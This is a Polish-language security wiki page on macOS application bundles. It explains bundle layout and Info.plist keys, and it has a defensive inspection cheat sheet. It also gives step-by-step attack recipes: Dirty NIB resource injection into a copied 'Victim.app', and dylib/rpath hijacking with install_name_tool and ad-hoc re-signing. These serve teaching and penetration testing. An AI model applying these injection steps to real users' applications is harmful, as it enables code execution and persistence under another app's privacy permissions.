# Pakiety macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Bundle w macOS pełnią funkcję kontenerów dla różnych zasobów, w tym aplikacji, bibliotek i innych niezbędnych plików, dzięki czemu w Finderze wyglądają jak pojedyncze obiekty, np. dobrze znane pliki `*.app`. Najczęściej spotykanym bundle jest `.app`, choć popularne są też inne typy, takie jak `.framework`, `.systemextension` i `.kext`.

### Podstawowe składniki pakietu

W obrębie pakietu, szczególnie w katalogu `<application>.app/Contents/`, znajduje się wiele ważnych zasobów:

- **\_CodeSignature**: Ten katalog przechowuje informacje dotyczące podpisu kodu niezbędne do weryfikacji integralności aplikacji. Możesz sprawdzić informacje o podpisie kodu używając poleceń takich jak:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Zawiera binarny plik wykonywalny aplikacji, który uruchamia się po interakcji użytkownika.
- **Resources**: Repozytorium komponentów interfejsu użytkownika aplikacji, w tym obrazów, dokumentów oraz opisów interfejsu (pliki nib/xib).
- **Info.plist**: Pełni rolę głównego pliku konfiguracyjnego aplikacji, kluczowego dla systemu, aby prawidłowo rozpoznać i współdziałać z aplikacją.

#### Important Keys in Info.plist

Plik `Info.plist` jest podstawą konfiguracji aplikacji i zawiera klucze takie jak:

- **CFBundleExecutable**: Określa nazwę głównego pliku wykonywalnego znajdującego się w katalogu `Contents/MacOS`.
- **CFBundleIdentifier**: Dostarcza globalny identyfikator aplikacji, szeroko wykorzystywany przez macOS do zarządzania aplikacjami.
- **LSMinimumSystemVersion**: Wskazuje minimalną wersję macOS wymaganą do uruchomienia aplikacji.

### Exploring Bundles

Aby zbadać zawartość pakietu, takiego jak `Safari.app`, można użyć następującego polecenia: `bash ls -lR /Applications/Safari.app/Contents`

To badanie ujawnia katalogi takie jak `_CodeSignature`, `MacOS`, `Resources` oraz pliki jak `Info.plist`, z których każdy pełni inną rolę — od zabezpieczenia aplikacji, po definiowanie interfejsu użytkownika i parametrów działania.

#### Additional Bundle Directories

Poza powszechnymi katalogami, bundle mogą także zawierać:

- **Frameworks**: Zawiera dołączone frameworki używane przez aplikację. Frameworki są podobne do dylibów, ale z dodatkowymi zasobami.
- **PlugIns**: Katalog dla plug-inów i rozszerzeń zwiększających możliwości aplikacji.
- **XPCServices**: Zawiera usługi XPC używane przez aplikację do komunikacji międzyprocesowej.

Taka struktura zapewnia, że wszystkie niezbędne komponenty są zamknięte w pakiecie, ułatwiając modularne i bezpieczne środowisko aplikacji.

Dla bardziej szczegółowych informacji o kluczach `Info.plist` i ich znaczeniach, dokumentacja Apple dla deweloperów zawiera obszerne zasoby: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Gdy skwarantynowany bundle uruchamiany jest po raz pierwszy, macOS wykonuje głęboką weryfikację podpisu i może uruchomić go z losowej, translokowanej ścieżki. Po zatwierdzeniu, kolejne uruchomienia wykonują tylko płytkie kontrole; pliki zasobów w `Resources/`, `PlugIns/`, nibs itp. historycznie były niesprawdzane. Od macOS 13 Ventura wykonywana jest głęboka weryfikacja przy pierwszym uruchomieniu, a nowe uprawnienie *App Management* w TCC ogranicza procesy stron trzecich przed modyfikowaniem innych bundle bez zgody użytkownika, jednak starsze systemy pozostają podatne.
- **Bundle Identifier collisions**: Wielokrotne używanie tego samego `CFBundleIdentifier` przez wbudowane cele (PlugIns, helper tools) może złamać walidację podpisu i niekiedy umożliwić przejęcie/zakłócenie obsługi schematów URL. Zawsze wylicz pod‑bundle i sprawdź, czy identyfikatory są unikatowe.

## Resource Hijacking (Dirty NIB / NIB Injection)

Przed Venturą, podmiana zasobów UI w podpisanej aplikacji mogła obejść płytkie sprawdzenie podpisu i doprowadzić do wykonania kodu z uprawnieniami aplikacji. Aktualne badania (2024) pokazują, że wciąż działa to na systemach przed Venturą oraz na buildach nieobjętych kwarantanną:

1. Skopiuj docelową aplikację do zapisywalnej lokalizacji (np. `/tmp/Victim.app`).
2. Zamień `Contents/Resources/MainMenu.nib` (lub dowolny nib zadeklarowany w `NSMainNibFile`) na złośliwy, który instancjonuje `NSAppleScript`, `NSTask` itd.
3. Uruchom aplikację. Złośliwy nib wykona się pod identyfikatorem bundle ofiary i z jej uprawnieniami (np. przyznaniami TCC, dostęp do mikrofonu/kamery itp.).
4. Ventura+ łagodzi ten wektor przez głęboką weryfikację bundle przy pierwszym uruchomieniu oraz wymaganie uprawnienia *App Management* do późniejszych modyfikacji, więc utrzymanie dostępu jest trudniejsze, ale ataki podczas pierwszego uruchomienia na starszych wersjach macOS wciąż działają.

Minimalny przykład złośliwego ładunku nib (skompiluj xib do nib za pomocą `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Ponieważ wyszukiwania przez `@rpath` preferują dołączone Frameworks/PlugIns, umieszczenie złośliwej biblioteki wewnątrz `Contents/Frameworks/` lub `Contents/PlugIns/` może zmienić kolejność ładowania, gdy główny plik binarny jest podpisany bez weryfikacji bibliotek lub ma słabe uporządkowanie `LC_RPATH`.

Typowe kroki przy wykorzystywaniu niepodpisanego/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Uwagi:
- Hardened runtime z brakiem `com.apple.security.cs.disable-library-validation` blokuje third‑party dylibs; najpierw sprawdź entitlements.
- Usługi XPC w `Contents/XPCServices/` często ładują sąsiednie frameworki — zmodyfikuj ich binaria w podobny sposób dla ścieżek persistence lub privilege escalation.

## Szybka ściągawka do inspekcji
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Źródła

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
